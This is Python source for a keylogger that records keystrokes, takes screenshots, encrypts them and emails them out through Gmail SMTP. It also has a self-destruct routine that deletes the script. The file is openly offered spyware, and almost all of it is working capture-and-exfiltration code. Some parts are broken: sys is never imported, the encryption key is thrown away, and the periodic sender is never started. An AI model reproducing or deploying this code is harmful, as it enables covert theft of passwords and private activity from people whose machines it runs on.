import argparse
import pynput.keyboard
import smtplib
import os
import platform
import time
import zipfile
from threading import Timer
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from pynput import keyboard
from PIL import ImageGrab
from cryptography.fernet import Fernet

def parse_args():
    parser = argparse.ArgumentParser(description="Keylogger with email reporting")
    parser.add_argument("-e", "--email", help="Email address to send the logs to")
    parser.add_argument("-p", "--password", help="Password for the email address")
    parser.add_argument("-i", "--interval", type=int, default=60, help="Interval (in seconds) for sending email reports")
    return parser.parse_args()

args = parse_args()

# Extracting email and password from command-line arguments or environment variables
email_address = args.email or os.getenv("EMAIL_ADDRESS")
email_password = args.password or os.getenv("EMAIL_PASSWORD")

if not email_address or not email_password:
    print("Error: Email address and password are required.")
    exit()

# Generate a key for encryption
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

# Timer interval in seconds
interval = args.interval

# Create a variable to store the keystrokes
keylogs = ""

# Create a function to handle the keystrokes
def on_press(key):
    global keylogs
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        elif key == key.esc:
            return False  # Stop listener on pressing 'Esc'
        else:
            current_key = " " + str(key) + " "
    keylogs += current_key

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def log_to_file(keylogs):
    with open("keylogs.txt", "a") as log_file:
        log_file.write(keylogs)

def take_screenshot():
    screenshot = ImageGrab.grab()
    filename = "screenshot_" + str(int(time.time())) + ".png"
    screenshot.save(filename)
    return filename

def compress_and_encrypt_screenshot(filename):
    zip_filename = filename + ".zip"
    with zipfile.ZipFile(zip_filename, 'w') as zip_file:
        zip_file.write(filename)
    os.remove(filename)
    return zip_filename

def encrypt_message(message):
    return cipher_suite.encrypt(message.encode())

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        encrypted_data = cipher_suite.encrypt(file.read())
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def send_email(email_address, email_password, keylogs, attachments):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = "Keylogger Data"
    msg.attach(MIMEText(keylogs))
    
    for attachment in attachments:
        with open(attachment, 'rb') as f:
            img_data = f.read()
        image = MIMEImage(img_data, name=os.path.basename(attachment))
        msg.attach(image)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, email_password)
        server.sendmail(email_address, email_address, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def periodic_send():
    global keylogs
    log_to_file(keylogs)
    encrypted_keylogs = encrypt_message(keylogs)
    screenshot = take_screenshot()
    compressed_screenshot = compress_and_encrypt_screenshot(screenshot)
    encrypt_file(compressed_screenshot)
    send_email(email_address, email_password, encrypted_keylogs, [compressed_screenshot])
    safe_remove(compressed_screenshot)
    keylogs = ""  # Clear keylogs after sending
    timer = Timer(interval, periodic_send)
    timer.start()

def safe_remove(file_path):
    try:
        os.remove(file_path)
    except Exception as e:
        print(f"Failed to remove {file_path}: {e}")

def self_destruct():
    script_path = sys.argv[0]
    os.remove(script_path)

try:
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    # Save keylogs to a file before exiting
    log_to_file(keylogs)
    print("Keylogs saved to file.")

    # Take a screenshot and send the email with the collected keylogs
    screenshot = take_screenshot()
    send_email(email_address, email_password, keylogs, [screenshot])
    safe_remove(screenshot)
    print("Keylogger interrupted and cleaned up.")
